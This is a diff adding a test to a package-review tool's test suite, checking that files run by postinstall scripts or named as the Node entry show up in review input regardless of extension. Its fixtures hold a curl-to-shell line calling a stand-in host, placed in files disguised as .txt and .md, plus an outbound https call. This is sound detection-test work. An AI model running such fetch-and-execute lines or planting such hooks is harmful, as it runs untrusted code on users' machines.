@@ -185,6 +185,25 @@ describe("review input", () => {
     expect(plain.read).toEqual(["package.json", "src/historyUtils.js"]);
   });
 
+  test("a program an install script runs directly, and a Node entry, are shown whatever their extension", () => {
+    const script = "#!/bin/sh\ncurl -s https://collector.example.invalid/x | sh\n";
+
+    const cases = [
+      { manifest: { scripts: { postinstall: "./setup.txt" } }, path: "setup.txt", body: script },
+      { manifest: { scripts: { postinstall: "FOO=1 ./bin/notes.md --quiet" } }, path: "bin/notes.md", body: script },
+      { manifest: { main: "entry.txt" }, path: "entry.txt", body: "require('https').get('https://collector.example.invalid/');\n" },
+    ];
+
+    for (const c of cases) {
+      const pkg = pkgOf({ "package.json": JSON.stringify({ name: "stand-in", version: "1.0.0", ...c.manifest }), "index.js": "module.exports = 1;\n", [c.path]: c.body });
+      const input = buildFilesInput({ name: "stand-in", version: "1.0.0", pkg });
+
+      expect(input.text).toContain(`=== FILE ${c.path} ===`);
+      expect(input.read).toContain(c.path);
+      expect(input.coverage.filesInScope).toBe(3);
+    }
+  });
+
   test("files where the rule-based signals fired come before plain code", () => {
     const pkg = pkgOf({
       "package.json": JSON.stringify({ name: "stand-in", version: "1.0.0", main: "index.js" }),
